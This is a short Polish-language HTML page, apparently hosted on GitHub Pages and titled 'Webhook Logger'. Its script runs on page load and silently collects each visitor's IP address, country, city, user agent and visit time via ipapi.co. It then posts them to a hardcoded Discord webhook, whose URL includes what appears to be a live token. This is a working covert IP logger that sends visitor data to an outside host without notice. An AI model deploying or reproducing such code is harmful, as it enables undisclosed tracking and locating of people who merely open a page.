<!DOCTYPE html>
<html lang="pl">
<head>
  <meta charset="UTF-8">
  <title>Webhook Logger - GitHub Pages</title>
</head>
<body>
  <h1>Webhook Logger - Test</h1>
  <p>Przykładowa strona wysyłająca dane do Discord Webhook.</p>

  <script>
    // Funkcja pobierająca dane IP oraz inne informacje użytkownika
    // i wysyłająca je do Discord Webhook
    function sendWebhook() {
      // Pobieramy dane IP oraz lokalizację za pomocą API ipapi.co
      fetch('https://ipapi.co/json/')
        .then(response => response.json())
        .then(data => {
          const ip = data.ip;
          const country = data.country_name;
          const city = data.city;
          const userAgent = navigator.userAgent;
          const timestamp = new Date().toISOString();

          // Przygotowanie treści wiadomości
          const message = `**Nowy użytkownik odwiedził stronę!**\n` +
                          `IP: ${ip}\n` +
                          `User Agent: ${userAgent}\n` +
                          `Kraj: ${country}\n` +
                          `Miasto: ${city}\n` +
                          `Czas: ${timestamp}`;

          // Adres Discord Webhook (upewnij się, że jest prawidłowy)
          const webhookUrl = "https://discordapp.com/api/webhooks/1338865518135873537/3M6zHVt24Z5__4wfsz_7PQ43NVc1GHOPSD9aIlvlN7Cn78SEc3jUYEhUbjD0H70ReNqA";

          // Wysyłamy dane do Discord Webhook metodą POST
          fetch(webhookUrl, {
            method: "POST",
            headers: {
              "Content-Type": "application/json"
            },
            body: JSON.stringify({ content: message })
          })
          .then(response => {
            if (response.ok) {
              console.log("Dane zostały wysłane do Discord Webhook.");
            } else {
              console.error("Błąd przy wysyłaniu danych do Discord Webhook.");
            }
          })
          .catch(error => {
            console.error("Błąd przy wysyłaniu żądania:", error);
          });
        })
        .catch(error => {
          console.error("Błąd przy pobieraniu danych IP:", error);
        });
    }

    // Uruchomienie funkcji po załadowaniu strony
    window.addEventListener("load", sendWebhook);
  </script>
</body>
</html>
